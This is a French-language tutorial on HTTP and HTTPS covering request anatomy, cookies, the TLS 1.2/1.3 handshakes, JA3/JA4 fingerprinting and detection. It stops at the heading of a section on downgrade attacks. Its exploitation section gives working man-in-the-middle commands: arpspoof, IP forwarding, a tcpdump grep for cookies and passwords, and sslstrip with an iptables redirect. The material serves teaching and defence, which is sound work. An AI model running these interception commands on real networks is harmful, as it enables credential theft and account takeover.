---
title: "Protocole HTTP & HTTPS : Mécanismes, TLS et Attaques"
description: "Anatomie complète des protocoles HTTP/1.1, HTTP/2, HTTP/3 et du handshake TLS, avec analyse des vecteurs d'attaque et recommandations de hardening."
tags:
  - http
  - https
  - tls
  - web-security
  - network
  - cryptography
  - request-smuggling
  - mitm
  - hsts
  - tls-downgrade
  - crlf-injection
  - pfs
---

# Protocole HTTP & HTTPS — Mécanismes, Handshake TLS et Modèles de Menaces

!!! warning "Cadre légal"
    Les techniques offensives décrites dans ce document ne doivent être mises en œuvre que dans
    un cadre légal explicite : laboratoire isolé, CTF, ou test d'intrusion couvert par une
    autorisation écrite.

---

## 1. Résumé exécutif & contexte

### HTTP/HTTPS dans le modèle OSI

**HTTP** (*HyperText Transfer Protocol*) est le protocole de la **couche Application (L7)** du
modèle OSI. Il régit l'intégralité des échanges entre clients (navigateurs, APIs, scripts) et
serveurs web. Par défaut, il fonctionne en texte clair sur le port **TCP/80**, sans aucune
protection contre la lecture ou la modification en transit.

**HTTPS** = HTTP + **TLS** (*Transport Layer Security*), opérant sur le port **TCP/443**. TLS
se positionne entre la couche Transport (TCP) et la couche Application (HTTP), dans ce qui
correspond fonctionnellement à la couche Présentation (L6) du modèle OSI.

```text
Modèle OSI / TCP-IP — positionnement des protocoles :

┌─────────────────────────────────────────────────────────────┐
│  L7 Application  │  HTTP, HTTPS, DNS, SMTP, FTP ...         │
├─────────────────────────────────────────────────────────────┤
│  L6 Présentation │  TLS / SSL (chiffrement, certificats)    │
├─────────────────────────────────────────────────────────────┤
│  L5 Session      │  (gestion de sessions TCP)               │
├─────────────────────────────────────────────────────────────┤
│  L4 Transport    │  TCP (HTTP/1.1, HTTP/2) / UDP (HTTP/3)   │
├─────────────────────────────────────────────────────────────┤
│  L3 Réseau       │  IP (IPv4, IPv6)                         │
├─────────────────────────────────────────────────────────────┤
│  L2 Liaison      │  Ethernet, Wi-Fi (802.11), PPP ...       │
├─────────────────────────────────────────────────────────────┤
│  L1 Physique     │  Câble cuivre, fibre, signal radio ...   │
└─────────────────────────────────────────────────────────────┘

Note HTTP/3 : QUIC (protocole sous-jacent) encapsule TLS 1.3 directement dans UDP.
Il n'y a pas de couche TCP séparée ; la fiabilité est gérée par QUIC lui-même.
```

!!! note "HTTP vs HTTPS — différences fondamentales"
    | Propriété | HTTP | HTTPS |
    |---|---|---|
    | Port par défaut | 80 | 443 |
    | Chiffrement | Aucun (texte brut) | TLS (AES-GCM, ChaCha20-Poly1305) |
    | Intégrité | Aucune | AEAD (Authenticated Encryption) |
    | Authentification du serveur | Aucune | Certificat X.509 signé par une CA |
    | Résistance au MitM | Nulle | Forte (avec HSTS et validation de cert.) |
    | Confidentialité des cookies | Nulle | Garantie si flag `Secure` présent |

### Évolution des versions HTTP

```text
Chronologie des versions HTTP :

HTTP/0.9 (1991) ─── Protocole minimaliste, GET uniquement, pas d'en-têtes
       │
HTTP/1.0 (1996) ─── Ajout des en-têtes, codes de statut, types MIME
  RFC 1945        └─ Problème : une connexion TCP par requête (overhead)
       │
HTTP/1.1 (1997) ─── Connexions persistentes (Keep-Alive), pipelining,
  RFC 9112 (2022)    transfert chunked, hôtes virtuels (Host header obligatoire)
       │             Toujours en texte ASCII — inefficace sur les réseaux modernes
       │
HTTP/2  (2015)  ─── Couche de framing BINAIRE, multiplexage sur une seule
  RFC 7540           connexion TCP, compression HPACK des en-têtes, Server Push,
                     priorisation des flux (streams)
                 └─ Problème persistant : HOL blocking au niveau TCP (un paquet
                    perdu bloque tous les flux simultanés)
       │
HTTP/3  (2022)  ─── Remplace TCP par QUIC (UDP + fiabilité applicative),
  RFC 9114           TLS 1.3 intégré dans QUIC (0-RTT natif), résolution du
                     HOL blocking au niveau transport, migration de connexion
                     (changement d'IP sans interruption, ex : Wi-Fi → 4G)
```

!!! tip "HTTP/2 et le problème du Head-Of-Line Blocking"
    HTTP/2 multiplexe plusieurs flux sur une seule connexion TCP. Si un segment TCP est perdu,
    le mécanisme de retransmission TCP bloque **tous** les flux en attente — même ceux n'ayant
    aucun rapport avec le paquet perdu. HTTP/3 (QUIC) résout ce problème car la fiabilité est
    gérée par flux individuels au niveau applicatif.

---

## 2. Anatomie détaillée d'un échange HTTP

### 2.1 Structure d'une requête HTTP

```text
Syntaxe générale d'une requête HTTP/1.1 :

┌─ Ligne de commande ─────────────────────────────────────────┐
│  MÉTHODE  /chemin/ressource?param=val  HTTP/version \r\n    │
└─────────────────────────────────────────────────────────────┘
┌─ En-têtes (Headers) ────────────────────────────────────────┐
│  Nom-Header: valeur \r\n                                    │
│  ...                                                        │
│  \r\n   ← ligne vide obligatoire séparant headers et body   │
└─────────────────────────────────────────────────────────────┘
┌─ Corps (Body / Payload) ────────────────────────────────────┐
│  [données optionnelles selon la méthode]                    │
└─────────────────────────────────────────────────────────────┘
```

```http
GET /api/v1/users?role=admin HTTP/1.1
Host: api.example.com
Accept: application/json
Accept-Language: fr-FR,fr;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Connection: keep-alive
Cookie: session=abc123def456; csrftoken=XYZ789
Cache-Control: no-cache

```

```http
POST /api/v1/login HTTP/1.1
Host: api.example.com
Content-Type: application/json
Content-Length: 47
Origin: https://app.example.com
Referer: https://app.example.com/login
X-CSRF-Token: XYZ789

{"email":"user@example.com","password":"S3cr3t!"}
```

**En-têtes de requête importants :**

| En-tête | Rôle | Implication sécurité |
|---|---|---|
| `Host` | Identifie l'hôte virtuel cible | Injectable si non validé côté serveur |
| `Authorization` | Transporte le token d'auth (`Bearer`, `Basic`) | Vol si transit non chiffré |
| `Cookie` | Transporte les cookies de session | XSS / vol si `HttpOnly` absent |
| `Origin` / `Referer` | Politique CORS, fuite d'URL | Contient parfois des tokens dans l'URL |
| `Content-Type` | Format du body | Content-Type confusion (MIME sniffing) |
| `X-Forwarded-For` | IP réelle derrière un proxy | Falsifiable — ne pas utiliser pour contrôle d'accès |
| `Transfer-Encoding` | Encodage du body (chunked) | Vecteur de Request Smuggling |

### 2.2 Verbes HTTP, idempotence et sécurité

!!! note "Définitions"
    - **Sûr** (*Safe*) : l'opération ne modifie pas l'état du serveur.
    - **Idempotent** : l'application répétée de la même requête produit le même effet
      qu'une application unique (le résultat est identique quelle que soit la fréquence d'appel).
    - **Cache** : la réponse peut être mise en cache par les intermédiaires.

| Méthode | Sûre | Idempotente | Corps (req) | Corps (rép) | Sécurité |
|---|:---:|:---:|:---:|:---:|---|
| `GET` | ✅ | ✅ | ❌ | ✅ | Données sensibles ne doivent jamais passer en query string |
| `HEAD` | ✅ | ✅ | ❌ | ❌ | Identique à GET, utile pour le fingerprinting sans body |
| `OPTIONS` | ✅ | ✅ | Opt | ✅ | Révèle les méthodes autorisées — indicateur de reconnaissance |
| `POST` | ❌ | ❌ | ✅ | ✅ | Risque CSRF si sans token ; idéal pour les actions non-idempotentes |
| `PUT` | ❌ | ✅ | ✅ | Opt | Remplacement complet d'une ressource — contrôle d'accès critique |
| `PATCH` | ❌ | ❌ | ✅ | Opt | Modification partielle — souvent moins protégé que PUT |
| `DELETE` | ❌ | ✅ | Opt | Opt | Action destructrice — authentification forte requise |
| `TRACE` | ✅ | ✅ | ❌ | ✅ | **Désactiver obligatoirement** — facilite Cross-Site Tracing (XST) |
| `CONNECT` | ❌ | ❌ | — | — | Création de tunnels HTTP — risque de proxy ouvert |

!!! danger "TRACE et Cross-Site Tracing (XST)"
    La méthode `TRACE` fait écho à la requête reçue dans la réponse. Combinée à XSS, elle permet
    de lire les en-têtes `HttpOnly` cookies via `XMLHttpRequest` sur les navigateurs anciens.
    **Toujours désactiver `TRACE` sur les serveurs web.**
    ```apache
    # Apache — désactivation de TRACE
    TraceEnable off
    ```
    ```nginx
    # Nginx — TRACE non supporté nativement, bloquer via limit_except
    limit_except GET HEAD POST PUT DELETE PATCH OPTIONS { deny all; }
    ```

### 2.3 Structure d'une réponse HTTP

```http
HTTP/1.1 200 OK
Date: Wed, 09 Sep 2026 14:30:00 GMT
Server: nginx/1.26.0                          ← Attention : révèle la version du serveur
Content-Type: application/json; charset=utf-8
Content-Length: 156
Cache-Control: no-store, no-cache, must-revalidate
X-Request-ID: 7f3a2b1c-4d5e-6f7a-8b9c-0d1e2f3a4b5c
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
Referrer-Policy: strict-origin-when-cross-origin

{"status":"ok","data":{"id":42,"role":"user","email":"user@example.com"}}
```

**Codes de statut HTTP — référence complète :**

```text
1xx — Informationnel
  100 Continue           : Le client peut continuer d'envoyer le corps de la requête
  101 Switching Protocols: Upgrade (ex : HTTP → WebSocket)
  103 Early Hints        : Préchargement de ressources (Link headers)

2xx — Succès
  200 OK                 : Requête traitée avec succès
  201 Created            : Ressource créée (POST/PUT réussi)
  204 No Content         : Succès sans corps de réponse (ex : DELETE)
  206 Partial Content    : Réponse partielle (plage d'octets)

3xx — Redirection
  301 Moved Permanently  : Redirection permanente (mise en cache par les navigateurs)
  302 Found              : Redirection temporaire
  304 Not Modified       : Ressource non modifiée (utiliser le cache local)
  307 Temporary Redirect : Redirection temporaire, préserve la méthode HTTP
  308 Permanent Redirect : Redirection permanente, préserve la méthode HTTP

4xx — Erreur client
  400 Bad Request        : Requête malformée
  401 Unauthorized       : Authentification requise ou invalide
  403 Forbidden          : Accès refusé (authentifié mais non autorisé)
  404 Not Found          : Ressource inexistante
  405 Method Not Allowed : Méthode HTTP non supportée pour cette URI
  408 Request Timeout    : Délai d'attente dépassé
  413 Payload Too Large  : Corps de requête trop volumineux
  429 Too Many Requests  : Rate limiting déclenché
  451 Unavailable For Legal Reasons : Blocage pour raisons légales

5xx — Erreur serveur
  500 Internal Server Error : Erreur générique côté serveur
  501 Not Implemented       : Méthode non implémentée
  502 Bad Gateway           : Réponse invalide du backend (reverse proxy)
  503 Service Unavailable   : Serveur temporairement indisponible (maintenance, surcharge)
  504 Gateway Timeout       : Délai backend dépassé (reverse proxy)
```

!!! warning "Codes de statut comme vecteur d'information"
    Les codes 401 vs 403, 404 vs 403, ou la présence d'un `500` avec stack trace constituent
    des fuites d'information exploitables pour la reconnaissance. Configurer des pages d'erreur
    génériques sans message technique exposé au client.

### 2.4 Gestion de la persistance & sessions

#### Cookies et leurs attributs de sécurité

```http
Set-Cookie: session_id=a3f2b9d1e4c7; \
  HttpOnly; \
  Secure; \
  SameSite=Strict; \
  Path=/; \
  Domain=example.com; \
  Max-Age=3600; \
  Partitioned
```

| Attribut | Effet | Absence = risque |
|---|---|---|
| `HttpOnly` | Interdit l'accès JS (`document.cookie`) | XSS peut voler le cookie |
| `Secure` | Transmis uniquement sur HTTPS | Cookie visible en HTTP clair (MitM, reniflage) |
| `SameSite=Strict` | Envoyé uniquement pour requêtes same-site | CSRF possible |
| `SameSite=Lax` | Envoyé pour navigation top-level cross-site (GET) | CSRF partiel |
| `SameSite=None; Secure` | Envoyé pour toutes les requêtes (cross-site) | Obligatoire d'avoir `Secure` |
| `Max-Age` / `Expires` | Durée de vie côté client | Session persistante indéfiniment sans expiration |
| `Domain` | Sous-domaines inclus si préfixé par `.` | Partage de cookie entre sous-domaines |
| `Path` | Restriction à un chemin URL | Accès par d'autres chemins de la même origine |
| `__Host-` prefix | Force `Secure`, `Path=/`, pas de `Domain` | Plus forte garantie d'origine |
| `__Secure-` prefix | Force `Secure` | Moins strict que `__Host-` |

```javascript
// JavaScript — accès à document.cookie sans HttpOnly
document.cookie
// → "session_id=a3f2b9d1e4c7; csrftoken=XYZ789"
// Avec HttpOnly : session_id n'apparaît pas — protégé contre XSS

// Test de détection : si le cookie de session n'est pas visible ici → HttpOnly présent
```

#### En-têtes d'autorisation

```http
# Basic Auth : base64(identifiant:motdepasse) — JAMAIS en HTTP clair
Authorization: Basic dXNlcjpwYXNzd29yZA==
# → base64_decode("dXNlcjpwYXNzd29yZA==") = "user:password" (trivial à décoder)

# Bearer Token (JWT) — à transmettre exclusivement via HTTPS
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9\
  .eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY3MDAwMDAwfQ\
  .SIG...

# Décodage du payload JWT (sans vérification de signature — outil : jwt.io)
# Header: {"alg":"RS256","typ":"JWT"}
# Payload: {"sub":"1234567890","role":"admin","iat":1767000000}
# Signature: [vérifiable uniquement avec la clé publique du serveur]

# Digest Auth (obsolète — vulnérable à des attaques hors ligne sur le condensat MD5)
Authorization: Digest username="user", realm="example.com", nonce="...", uri="/path",
               response="[MD5_hash]", algorithm=MD5

# API Key (pattern courant — à mettre en en-tête, jamais en query string)
X-API-Key: sk-prod-abcdef1234567890
```

!!! danger "Basic Auth et Basic Auth en clair"
    L'encodage Base64 n'est PAS un chiffrement. Une capture réseau sur un trafic HTTP (sans TLS)
    révèle immédiatement les identifiants. Même sur HTTPS, Basic Auth est déconseillé en production
    au profit de OAuth 2.0 / OpenID Connect ou de tokens à durée de vie courte.

---

## 3. Fonctionnement interne de HTTPS & Handshake TLS

### 3.1 Les trois piliers cryptographiques de TLS

| Objectif | Mécanisme TLS | Algorithme typique |
|---|---|---|
| **Confidentialité** | Chiffrement symétrique du flux de données | AES-256-GCM, ChaCha20-Poly1305 |
| **Intégrité** | AEAD (Authenticated Encryption with Associated Data) | Tag d'intégrité inclus dans AEAD |
| **Authentification** | Certificats X.509 signés par une CA de confiance | RSA-2048/4096, ECDSA P-256/P-384 |
| **PFS** | Échange de clés éphémère Diffie-Hellman | ECDHE (courbes X25519, P-256) |

### 3.2 Handshake TLS 1.3 — Analyse pas-à-pas (1-RTT)

```text
TLS 1.3 Handshake — diagramme de séquence complet

Client                                                    Server
  │                                                         │
  │──── ClientHello ──────────────────────────────────────► │
  │     ├─ supported_versions: [TLS 1.3, TLS 1.2]          │
  │     ├─ cipher_suites: [AES_256_GCM_SHA384,             │
  │     │                   CHACHA20_POLY1305_SHA256,       │
  │     │                   AES_128_GCM_SHA256]             │
  │     ├─ client_random: [32 octets aléatoires]           │
  │     ├─ key_share: [X25519 public key du client]        │
  │     ├─ server_name (SNI): "api.example.com"            │
  │     └─ supported_groups: [x25519, secp256r1, secp384r1]│
  │                                                         │
  │◄─── ServerHello ──────────────────────────────────────  │
  │     ├─ selected_version: TLS 1.3                        │
  │     ├─ cipher_suite: TLS_AES_256_GCM_SHA384             │
  │     ├─ server_random: [32 octets aléatoires]           │
  │     └─ key_share: [X25519 public key du serveur]       │
  │                                                         │
  │  [Les deux parties dérivent indépendamment              │
  │   le secret partagé via ECDH(E) sur X25519 :           │
  │   shared_secret = DH(client_private, server_public)    │
  │                 = DH(server_private, client_public)     │
  │   → Handshake keys → Application keys via HKDF]        │
  │                                                         │
  │◄─── {EncryptedExtensions} ──────────────────────────── │  ← CHIFFRÉ dès ici
  │     └─ ALPN: "h2", early_data, max_fragment_length      │
  │                                                         │
  │◄─── {Certificate} ──────────────────────────────────── │
  │     └─ Certificat X.509 du serveur (DER encodé)        │
  │        ├─ CN/SAN: api.example.com                       │
  │        ├─ Issuer: Let's Encrypt Authority X3            │
  │        ├─ Validity: 2026-07-01 → 2026-10-01            │
  │        └─ Public Key: ECDSA P-256                       │
  │                                                         │
  │◄─── {CertificateVerify} ────────────────────────────── │
  │     └─ Signature ECDSA sur la transcription du handshake│
  │        (prouve la possession de la clé privée associée │
  │         au certificat présenté)                         │
  │                                                         │
  │◄─── {Finished} ─────────────────────────────────────── │
  │     └─ HMAC-SHA384 sur la transcription complète       │
  │        (authentifie l'intégralité du handshake serveur) │
  │                                                         │
  │──── {Finished} ─────────────────────────────────────── ►│
  │     └─ HMAC-SHA384 sur la transcription complète        │
  │        (authentifie l'intégralité du handshake client)  │
  │                                                         │
  │◄══════════════ Données applicatives chiffrées ═════════►│
  │   {Application Data} HTTP/2 ou HTTP/1.1 sur TLS        │
```

!!! note "Clés éphémères et Perfect Forward Secrecy (PFS)"
    Dans TLS 1.3, **toutes** les suites de chiffrement utilisent ECDHE (Elliptic Curve
    Diffie-Hellman Ephemeral). Les clés générées pour chaque session sont jetées après usage.
    Si un attaquant capture le trafic chiffré aujourd'hui et obtient la clé privée du serveur
    demain, il **ne pourra toujours pas déchiffrer** les sessions passées, car les clés de
    session éphémères n'existent plus. TLS 1.2 avec RSA statique (sans ECDHE) ne garantit
    **pas** la PFS.

### 3.3 Handshake TLS 1.2 — Comparaison (2-RTT)

```text
TLS 1.2 Handshake — diagramme simplifié (2 allers-retours)

Client                                               Server
  │                                                    │
  │──── ClientHello ─────────────────────────────────►│   RTT 1 (aller)
  │     ├─ Version max supportée: TLS 1.2              │
  │     ├─ client_random                               │
  │     └─ cipher_suites (liste variable)              │
  │                                                    │
  │◄─── ServerHello ─────────────────────────────────  │   RTT 1 (retour)
  │◄─── Certificate                                    │
  │◄─── ServerKeyExchange (si ECDHE/DHE)               │
  │◄─── ServerHelloDone                                │
  │                                                    │
  │──── ClientKeyExchange ───────────────────────────►│   RTT 2 (aller)
  │     └─ pre-master secret chiffré avec clé publique │
  │        du serveur (RSA) OU contribution DH client   │
  │──── ChangeCipherSpec ─────────────────────────────►│
  │──── Finished ─────────────────────────────────────►│
  │                                                    │
  │◄─── ChangeCipherSpec ────────────────────────────  │   RTT 2 (retour)
  │◄─── Finished                                       │
  │                                                    │
  │◄══════════ Application Data chiffrées ════════════►│
```

**Comparaison TLS 1.2 vs TLS 1.3 :**

| Critère | TLS 1.2 | TLS 1.3 |
|---|---|---|
| Nombre de RTT | 2 | 1 (+ 0-RTT optionnel) |
| Échange de clés | RSA ou DHE/ECDHE | ECDHE **uniquement** |
| PFS | Optionnelle (dépend de la suite) | **Obligatoire** |
| Suites de chiffrement | >300 dont des faibles | 5 uniquement, toutes AEAD |
| Chiffrement du handshake | Partiel (Finished seulement) | Dès ServerHello (certificat chiffré) |
| Compression TLS | Supportée (CRIME vulnérable) | **Supprimée** |
| Renégociation | Supportée (vulnérable) | **Supprimée** |
| 0-RTT | Non | Optionnel (avec risques) |

### 3.4 Validation de la chaîne de confiance X.509

```text
Chaîne de certificats (Chain of Trust) :

┌─────────────────────────────────────────────────────┐
│             Root CA (Autorité Racine)               │
│  Certificat auto-signé, stocké dans le magasin      │
│  de certificats du système d'exploitation /         │
│  navigateur (Mozilla NSS, Microsoft Root Store...)  │
│                                                     │
│  CN: DST Root CA X3  ──── signé par lui-même       │
└───────────────────────┬─────────────────────────────┘
                        │ signe (RSA/ECDSA)
┌───────────────────────▼─────────────────────────────┐
│          Intermediate CA (CA Intermédiaire)         │
│  Signé par la Root CA. Les Root CA signent rarement │
│  directement — les intermédiaires sont révoqués      │
│  plus facilement.                                   │
│                                                     │
│  CN: Let's Encrypt R11  ──── signé par DST Root    │
└───────────────────────┬─────────────────────────────┘
                        │ signe (RSA/ECDSA)
┌───────────────────────▼─────────────────────────────┐
│          Certificat d'entité finale (Leaf)          │
│  Présenté par le serveur lors du handshake TLS.     │
│  Validé par le client :                             │
│   1. Signature de l'intermédiaire vérifiable        │
│   2. Période de validité non expirée                │
│   3. SAN (Subject Alt Names) = hostname contacté   │
│   4. Non révoqué (CRL / OCSP)                      │
│                                                     │
│  CN: api.example.com   ──── signé par Let's Encrypt │
└─────────────────────────────────────────────────────┘
```

**Mécanismes de révocation :**

```bash
# OCSP (Online Certificate Status Protocol) — vérification en temps réel
# Le client interroge le répondeur OCSP de la CA pour l'état du certificat

# OCSP Stapling : le SERVEUR pré-récupère et met en cache la réponse OCSP signée
# (évite la latence d'une requête OCSP supplémentaire du client + préserve la vie privée)
openssl s_client -connect api.example.com:443 -status 2>/dev/null | grep -A 10 "OCSP Response"
# OCSP Response Status: successful (0x0)
# This Update: Sep  1 00:00:00 2026 GMT
# Next Update: Sep  8 00:00:00 2026 GMT

# Vérification manuelle de la chaîne de certificats
openssl s_client -connect api.example.com:443 -showcerts 2>/dev/null \
    | openssl x509 -noout -text | grep -E "Subject:|Issuer:|Not After|SAN"
```

### 3.5 Reprise de session (Session Resumption) et 0-RTT

```text
Session Resumption (TLS 1.3 — Session Tickets) :

Connexion initiale :
  Client ──── Handshake complet 1-RTT ────► Server
         ◄─── {NewSessionTicket} ─────────  Server
               └─ ticket chiffré avec clé serveur (masque la clé de session)

Connexion suivante (1-RTT standard) :
  Client ──── ClientHello + session_ticket ─►Server
         ◄─── ServerHello + Finished ──────  Server
         ══════ Application Data ═══════════►

0-RTT (Early Data) :
  Client ──── ClientHello + session_ticket ─►Server
              + {Early Data} ──────────────►         ← données envoyées AVANT Finished
         ◄─── ServerHello + Finished ──────  Server
         ══════ Application Data ═══════════►
```

!!! danger "Risque Replay avec le 0-RTT"
    Les données `Early Data` (0-RTT) **ne sont pas protégées contre les attaques par rejeu**.
    Un attaquant ayant capturé un ClientHello avec Early Data peut le rejouer sur le même serveur
    ou un autre nœud du cluster, déclenchant à nouveau l'action transportée (idéal pour un
    attaquant visant une action à effet de bord : `POST /payment/process`).
    **Recommandation** : limiter le 0-RTT aux requêtes strictement idempotentes (`GET`, `HEAD`)
    ou le désactiver complètement si le serveur ne peut pas valider l'absence de rejeu.

---

## 4. Empreinte, Fuzzing & Détection

### 4.1 TLS Fingerprinting — JA3 & JA4

Le **JA3** est un fingerprint calculé côté serveur à partir des champs du ClientHello,
permettant d'identifier le client TLS sans connaissance du contenu applicatif.

```text
Calcul du fingerprint JA3 :

JA3 = MD5( SSLVersion , Ciphers , Extensions , EllipticCurves , EllipticCurvePointFormats )
         └── séparés par des virgules, chaque liste par des tirets

Exemple :
  SSLVersion   : 771  (= TLS 1.2 en décimal)
  Ciphers      : 49195-49199-49196-49200-52393-52392-49161
  Extensions   : 0-23-65281-10-11-35-16-5-13-18-51-45-43-21
  Groups       : 29-23-24
  PointFormats : 0

JA3 string : "771,49195-...,0-23-...,29-23-24,0"
JA3 hash   : MD5("771,49195-...") = "a0e9f5d64349fb13191bc781f81f42e1"

→ Ce hash est identique pour tout client utilisant Chrome 120 sur Linux,
  quelle que soit la destination contactée.
```

```text
JA4 (format amélioré, 2023) :

JA4 = t{TLS version}{SNI yn}{nb ciphers}{nb extensions}{ALPN 1er et 2e char}_{ciphers triés}_{extensions triées sans SNI/ALPN}

Exemple JA4 : t13d1516h2_8daaf6152771_e5627efa2ab1

Avantages par rapport à JA3 :
- Plus stable (moins affecté par l'ordre des extensions)
- Lisible (version TLS directement visible)
- Décomposable en segments pour les règles de détection
```

```python
# Capture de la JA3 hash via scapy (exemple conceptuel)
from scapy.all import sniff, TLS

def extract_ja3(pkt):
    if pkt.haslayer(TLS) and pkt[TLS].type == 1:  # ClientHello
        tls = pkt[TLS]
        # Extraire : version, cipher suites, extensions, courbes, point formats
        ja3_components = build_ja3_string(tls)
        ja3_hash = hashlib.md5(ja3_components.encode()).hexdigest()
        print(f"Source IP: {pkt['IP'].src} → JA3: {ja3_hash}")

sniff(iface="eth0", filter="tcp port 443", prn=extract_ja3)
```

### 4.2 HTTP Header Order Fingerprinting

Différents clients HTTP envoient les en-têtes dans des ordres distincts et prévisibles,
permettant d'identifier le type de client même sans JavaScript.

```text
Exemple de fingerprint par ordre d'en-têtes :

Chrome (Linux) :
  Host → Connection → Content-Length → Cache-Control → sec-ch-ua → sec-ch-ua-Mobile →
  User-Agent → sec-ch-ua-Platform → Accept → Origin → Referer → Accept-Encoding →
  Accept-Language → Cookie

curl/7.x :
  Host → User-Agent → Accept → Content-Type → Content-Length

Python requests/2.x :
  Host → User-Agent → Accept-Encoding → Accept → Connection → Content-Type → Content-Length

→ Un bot se faisant passer pour Chrome mais envoyant les en-têtes dans l'ordre "requests"
  est immédiatement identifiable par ce fingerprint.
```

### 4.3 Inspection Red Team

```bash
# Analyse détaillée du handshake TLS et des en-têtes HTTP
curl -v --tls13-ciphers TLS_AES_256_GCM_SHA384 \
     --tlsv1.3 \
     -H "User-Agent: Mozilla/5.0" \
     https://api.example.com/endpoint 2>&1 | head -60

# Résultat type :
# *   Trying 93.184.216.34:443...
# * Connected to api.example.com (93.184.216.34) port 443
# * ALPN: curl offers h2,http/1.1
# * TLSv1.3 (OUT), TLS handshake, Client hello (1):
# * TLSv1.3 (IN), TLS handshake, Server hello (2):
# * TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
# * TLSv1.3 (IN), TLS handshake, Certificate (11):
# * TLSv1.3 (IN), TLS handshake, CERT verify (15):
# * TLSv1.3 (IN), TLS handshake, Finished (20):
# * TLSv1.3 (OUT), TLS handshake, Finished (20):
# * SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
# * ALPN: server accepted h2

# Inspection complète du certificat et de la chaîne
openssl s_client \
    -connect api.example.com:443 \
    -servername api.example.com \
    -showcerts \
    -status \          # Demander l'OCSP Stapling
    2>/dev/null | openssl x509 -noout -text

# Test de protocoles obsolètes (SSLv3, TLS 1.0, TLS 1.1)
openssl s_client -connect cible.com:443 -ssl3 2>&1 | grep -E "CONNECTED|error"
openssl s_client -connect cible.com:443 -tls1   2>&1 | grep -E "CONNECTED|error"
openssl s_client -connect cible.com:443 -tls1_1 2>&1 | grep -E "CONNECTED|error"
# Si "CONNECTED" → protocole obsolète supporté → vulnérable aux attaques de downgrade

# Énumération des cipher suites supportées
nmap --script ssl-enum-ciphers -p 443 cible.com
# Résultat : liste complète des ciphers avec note de sécurité (A/B/C/F)
```

```bash
# Analyse HTTP brute — inspection des en-têtes de réponse complets
curl -s -I -X GET https://cible.com/ | \
    grep -E "Server:|X-Powered-By:|Set-Cookie:|X-Frame:|CSP:|HSTS:|X-Content:"
# Recherche de :
# - Server: nginx/1.14.0  → version exposée
# - X-Powered-By: PHP/7.4 → langage et version exposés
# - Set-Cookie: session=... sans HttpOnly/Secure → cookie vulnérable

# Requête OPTIONS pour découvrir les méthodes autorisées
curl -s -X OPTIONS https://cible.com/ -i | grep -i "allow:"
# Allow: GET, POST, OPTIONS    → méthodes autorisées
# Si TRACE ou DELETE présent → vecteur potentiel
```

### 4.4 Détection Blue Team

```text
Points de détection et de contrôle côté défense :

1. INSPECTION TLS EN LIGNE (SSL Inspection)
   ┌─────────┐   TLS 1.3 chiffré   ┌─────────────┐   TLS réchiffré   ┌────────┐
   │ Client  │ ──────────────────► │ Proxy SSL   │ ────────────────► │ Server │
   │         │ ◄────────────────── │ (intercept) │ ◄──────────────── │        │
   └─────────┘                     └─────────────┘                   └────────┘
                                         │
                                    Inspection DPI
                                    WAF, IDS, DLP
   Risque : introduit un point de compromission — le proxy voit TOUT le trafic déchiffré

2. LOGS WAF (Web Application Firewall)
   - Requêtes avec méthodes anormales (TRACE, CONNECT vers l'appli)
   - En-têtes suspects : X-Forwarded-For avec IPs internes, Host non attendu
   - Tentatives de Request Smuggling : Transfer-Encoding obfusqué
   - CRLF dans les paramètres : présence de %0d%0a / \r\n

3. CERTIFICATE TRANSPARENCY (CT) LOGS
   - Surveillance des nouveaux certificats émis pour son domaine
   - Détection de phishing via certificats similaires (example.com vs examp1e.com)
   - Outils : crt.sh, Facebook CT Monitor, Google Certificate Transparency

4. MÉTRIQUES SIEM / EDR
   - Pic de connexions TLS échouées → scan ou attaque de downgrade
   - Jitter de latence anormal → proxy MitM interceptant et réchiffrant
   - JA3 hashes inconnus dans les connexions internes → outil suspect
   - Changements de certificat non planifiés → potentielle substitution
```

---

## 5. Méthodologie d'exploitation & faiblesses courantes

### Variante 1 : Insecure Transport — HTTP en clair & MitM

**Scénario** : un utilisateur accède à une application via HTTP (non HTTPS) sur un réseau
partagé (Wi-Fi public, réseau d'entreprise non segmenté). Un attaquant positionné sur le même
réseau peut capturer et modifier le trafic.

```bash
# Étape 1 — ARP Spoofing : positionner l'attaquant comme passerelle par défaut de la victime
# (outil : arpspoof de dsniff ou Ettercap)
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1  # Empoisonne la victime (.10) vers la passerelle (.1)
arpspoof -i eth0 -t 192.168.1.1  192.168.1.10 # Empoisonne la passerelle vers la victime

# Étape 2 — Activation du routage IP (pour relayer le trafic intercepté)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Étape 3 — Capture Wireshark / tcpdump sur le trafic HTTP
tcpdump -i eth0 -A -s 0 'host 192.168.1.10 and port 80' | \
    grep -E "Cookie:|Authorization:|password|session"
# → Tous les cookies, tokens et mots de passe transitent en clair
```

```bash
# SSLstrip : redirection HTTPS → HTTP via attaque de downgrade applicatif
# Interception du trafic avant que le navigateur ne charge HSTS
mitmproxy --mode transparent -p 8080
# ou
sslstrip -l 8080  # Remplace les liens https:// par http:// dans les réponses
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

!!! danger "Cookie sans flag `Secure` — extraction directe"
    ```http
    # Requête HTTP capturée par l'attaquant (texte brut, réseau Wi-Fi)
    GET /dashboard HTTP/1.1
    Host: app.example.com
    Cookie: session_id=8f3a7d2e9b1c4f5a; cart_total=350
    # ↑ session_id accessible à l'attaquant → Account Takeover immédiat
    ```

!!! tip "Protection : HSTS et cookies Secure"
    ```http
    # En-tête HSTS envoyé lors de la première connexion HTTPS
    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    # Après réception de cet en-tête, le navigateur refusera TOUTE connexion HTTP
    # vers ce domaine (et ses sous-domaines) pendant 31 536 000 secondes (1 an)
    # Le preload permet l'inscription dans la liste HSTS préchargée des navigateurs
    ```

---

### Variante 2 : Attaques sur la négociation TLS/SSL — Downgrade

